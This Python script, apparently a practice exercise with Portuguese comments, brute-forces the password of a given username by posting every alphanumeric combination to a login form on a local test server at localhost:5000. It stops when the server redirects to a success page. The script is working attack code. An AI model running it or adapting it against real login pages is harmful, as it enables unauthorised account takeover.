import requests
from itertools import product
from datetime import datetime

nome_usuario = input('Digite o nome do usuário: ')

inicio = datetime.now()

# Probabilidades
alfabeto = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9']
qnt_tentativa = 0 # Qnt tentativas foi buscado
qnt_caracter = 1 # Qnt caracter está buscando
buscando = True # True se estiver buscando

while buscando:
    print(f"Buscando {qnt_caracter} caracter")
    genComb = product(alfabeto, repeat=qnt_caracter)

    for subset in genComb:
        qnt_tentativa += 1
        senha_teste = ''.join(map(str, subset))

        print(f"Tentantdo: {senha_teste}")
        
        request_teste = requests.post('http://localhost:5000/', {'username':nome_usuario, 'password':senha_teste})
        if request_teste.url == 'http://localhost:5000/teste_user':
            print("----------------------------------------------------")
            print('Usuario encontrado')
            print(f"Encontrado: {subset}")
            buscando = False
            break
        else:
            print('Usuário inválido')
    
    qnt_caracter += 1

fim = datetime.now()
diff = (fim - inicio).total_seconds()
print(f"Tentativas: {qnt_tentativa}")
print(f"Tempo: {int(diff// 3600)}:{int(diff// 60)}:{int(diff % 60)}")